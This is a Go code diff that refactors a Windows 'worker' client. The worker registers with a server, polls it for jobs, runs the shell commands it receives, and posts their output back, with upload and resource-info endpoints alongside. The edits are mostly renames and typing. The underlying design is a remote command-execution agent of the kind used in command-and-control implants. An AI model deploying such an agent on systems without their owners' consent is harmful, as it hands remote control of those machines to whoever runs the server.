@@ -21,12 +21,14 @@ const (
 	maxDelay = 60
 )
 
+type RequestType int
+
 const (
-	REGISTER = iota
+	REGISTER RequestType = iota
 	RESOURCE
 	RETRIEVE
-	REPORT
-	UPLOAD
+	REPORTS
+	UPLOADS
 )
 
 type Worker struct {
@@ -49,22 +51,15 @@ type ResourceInfo struct {
 	Ram string `json:"ram"`
 }
 
-type Job struct {
-	Id      int    `json:"id"`
-	Todo    string `json:"todo"`
-	IsDone  bool   `json:"is_done"`
-	Created string `json:"created"`
-}
-
 // TODO: check for wrong input?
-func buildRequestUrl(reqType int, workerId, jobId string) string {
+func buildRequestUrl(reqType RequestType, workerId, jobId string) string {
 	baseUrl := serverAddr + "/api/workers/" + workerId
 	switch reqType {
 	case RETRIEVE:
 		return baseUrl + "/jobs/undone"
-	case REPORT:
+	case REPORTS:
 		return baseUrl + "/jobs/" + jobId + "/report"
-	case UPLOAD:
+	case UPLOADS:
 		return baseUrl + "/uploads"
 	case RESOURCE:
 		return baseUrl + "/resource-info"
@@ -153,17 +148,17 @@ func (w *Worker) poll() {
 }
 
 func (w *Worker) resolve(job Job) {
-	todo, args := utils.ParseJob(job.Todo)
+	todo, args := parseJob(job.Todo)
 	switch todo {
-	case utils.UNKNOWN:
-	case utils.SHELL_CMD:
+	case UNKNOWN:
+	case SHELL_CMD:
 		output, _ := win.ExecuteCommand(args...)
 		w.report(job.Id, output)
 	}
 }
 
 func (w *Worker) report(jobId int, rep string) { // TODO: accept only bytes?
-	reportUrl := buildRequestUrl(REPORT, w.id, strconv.Itoa(jobId)) // TODO: change ids to string!!
+	reportUrl := buildRequestUrl(REPORTS, w.id, strconv.Itoa(jobId)) // TODO: change ids to string!!
 	resp, err := http.Post(reportUrl, "text/plain;charset=UTF-8", bytes.NewBuffer([]byte(rep)))
 	if err == nil {
 		resp.Body.Close()
